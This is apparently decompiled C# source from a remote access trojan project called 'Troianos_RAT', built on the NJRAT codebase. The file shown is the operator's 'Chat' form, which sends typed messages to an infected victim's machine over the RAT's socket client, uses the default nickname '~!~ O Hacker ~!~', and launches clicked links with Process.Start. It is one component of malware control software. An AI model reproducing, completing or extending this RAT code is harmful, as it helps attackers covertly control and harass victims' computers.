using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x0200000C RID: 12
	[DesignerGenerated]
	public partial class Chat : Form
	{
		// Token: 0x060000C6 RID: 198 RVA: 0x001DF92C File Offset: 0x001DDD2C
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Chat.__ENCList;
			lock (_ENCList)
			{
				bool flag = Chat.__ENCList.Count == Chat.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Chat.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Chat.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Chat.__ENCList[num] = Chat.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Chat.__ENCList.RemoveRange(num, Chat.__ENCList.Count - num);
					Chat.__ENCList.Capacity = Chat.__ENCList.Count;
				}
				Chat.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060000C9 RID: 201 RVA: 0x001DFE10 File Offset: 0x001DE210
		// (set) Token: 0x060000CA RID: 202 RVA: 0x001DFE28 File Offset: 0x001DE228
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x060000CB RID: 203 RVA: 0x001DFE34 File Offset: 0x001DE234
		// (set) Token: 0x060000CC RID: 204 RVA: 0x001DFE4C File Offset: 0x001DE24C
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkClickedEventHandler value2 = new LinkClickedEventHandler(this.T1_LinkClicked);
				bool flag = this._T1 != null;
				if (flag)
				{
					this._T1.LinkClicked -= value2;
				}
				this._T1 = value;
				flag = (this._T1 != null);
				if (flag)
				{
					this._T1.LinkClicked += value2;
				}
			}
		}

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x060000CD RID: 205 RVA: 0x001DFEAC File Offset: 0x001DE2AC
		// (set) Token: 0x060000CE RID: 206 RVA: 0x001DFEC4 File Offset: 0x001DE2C4
		internal virtual TextBox T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.T2_TextChanged);
				KeyEventHandler value3 = new KeyEventHandler(this.T2_KeyDown);
				bool flag = this._T2 != null;
				if (flag)
				{
					this._T2.TextChanged -= value2;
					this._T2.KeyDown -= value3;
				}
				this._T2 = value;
				flag = (this._T2 != null);
				if (flag)
				{
					this._T2.TextChanged += value2;
					this._T2.KeyDown += value3;
				}
			}
		}

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060000CF RID: 207 RVA: 0x001DFF4C File Offset: 0x001DE34C
		// (set) Token: 0x060000D0 RID: 208 RVA: 0x001DFF64 File Offset: 0x001DE364
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x060000D1 RID: 209 RVA: 0x001DFFC4 File Offset: 0x001DE3C4
		// (set) Token: 0x060000D2 RID: 210 RVA: 0x001DFFDC File Offset: 0x001DE3DC
		internal virtual Timer vmethod_8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._vmethod_8 != null;
				if (flag)
				{
					this._vmethod_8.Tick -= value2;
				}
				this._vmethod_8 = value;
				flag = (this._vmethod_8 != null);
				if (flag)
				{
					this._vmethod_8.Tick += value2;
				}
			}
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x001E003C File Offset: 0x001DE43C
		public Chat()
		{
			base.FormClosing += this.Chat_FormClosing;
			base.Load += this.Chat_Load;
			Chat.__ENCAddToList(this);
			this.hk = "~!~ O Hacker ~!~";
			this.InitializeComponent();
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x001E0094 File Offset: 0x001DE494
		private void Chat_FormClosing(object sender, FormClosingEventArgs e)
		{
			bool cn = this.sk.CN;
			if (cn)
			{
				this.sk.Send("@");
			}
			this.sk.CN = false;
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x001E00D0 File Offset: 0x001DE4D0
		private void Chat_Load(object sender, EventArgs e)
		{
			this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)));
			this.Show();
			string left = Interaction.InputBox("Digite Seu Apelido", "Chat", this.hk, -1, -1);
			bool flag = Operators.CompareString(left, string.Empty, false) == 0;
			if (flag)
			{
				this.sk.CN = false;
			}
			else
			{
				this.hk = left;
				this.sk.Send("~" + Class7.string_1 + Class6.smethod_14(ref this.hk));
			}
			this.vmethod_8.Enabled = true;
			this.T2.Select();
			this.T2.Focus();
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x001E0194 File Offset: 0x001DE594
		private void T2_KeyDown(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				e.SuppressKeyPress = true;
				flag = (Operators.CompareString(this.T2.Text, string.Empty, false) != 0);
				if (flag)
				{
					lock (this)
					{
						this.T1.SelectionStart = this.T1.TextLength;
						this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
						this.T1.AppendText("[" + this.hk + "] ");
						this.T1.SelectionFont = this.T1.Font;
						this.T1.AppendText(this.T2.Text + "\r\n");
						this.T1.SelectionStart = this.T1.TextLength;
						this.T1.ScrollToCaret();
						TextBox t = this.T2;
						string text = t.Text;
						t.Text = text;
						this.sk.Send("!" + Class7.string_1 + Class6.smethod_14(ref text));
						this.T2.Text = string.Empty;
					}
				}
			}
			else
			{
				this.T2.Select();
			}
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x001E0318 File Offset: 0x001DE718
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.T2.Text, string.Empty, false) != 0;
			if (flag)
			{
				lock (this)
				{
					this.T1.SelectionStart = this.T1.TextLength;
					this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
					this.T1.AppendText("[" + this.hk + "] ");
					this.T1.SelectionFont = this.T1.Font;
					this.T1.AppendText(this.T2.Text + "\r\n");
					this.T1.SelectionStart = this.T1.TextLength;
					this.T1.ScrollToCaret();
					TextBox t = this.T2;
					string text = t.Text;
					t.Text = text;
					this.sk.Send("!" + Class7.string_1 + Class6.smethod_14(ref text));
					this.T2.Text = string.Empty;
				}
			}
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x001E0470 File Offset: 0x001DE870
		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.sk == null | this.osk == null;
			if (flag)
			{
				bool flag2 = this.T2.Enabled | Operators.CompareString(this.T1.Text, string.Empty, false) == 0;
				if (flag2)
				{
					this.T1.AppendText("Desconectado...");
				}
				this.T2.Enabled = false;
				this.Button1.Enabled = false;
				this.sk.Send("@");
				this.sk.CN = false;
				this.Close();
			}
			else
			{
				bool flag2 = !this.sk.CN | !this.osk.CN;
				if (flag2)
				{
					flag = (this.T2.Enabled | Operators.CompareString(this.T1.Text, string.Empty, false) == 0);
					if (flag)
					{
						this.T1.AppendText("Desconectado...");
					}
					this.T2.Enabled = false;
					this.Button1.Enabled = false;
					this.sk.Send("@");
					this.sk.CN = false;
					this.Close();
				}
			}
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x001E05B0 File Offset: 0x001DE9B0
		private void T1_LinkClicked(object sender, LinkClickedEventArgs e)
		{
			try
			{
				Process.Start(e.LinkText);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000DA RID: 218 RVA: 0x001E05F0 File Offset: 0x001DE9F0
		private void T2_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x04000062 RID: 98
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000064 RID: 100
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x04000065 RID: 101
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x04000066 RID: 102
		[AccessedThroughProperty("T2")]
		private TextBox _T2;

		// Token: 0x04000067 RID: 103
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000068 RID: 104
		[AccessedThroughProperty("vmethod_8")]
		private Timer _vmethod_8;

		// Token: 0x04000069 RID: 105
		public string hk;

		// Token: 0x0400006A RID: 106
		public Client osk;

		// Token: 0x0400006B RID: 107
		public Client sk;
	}
}
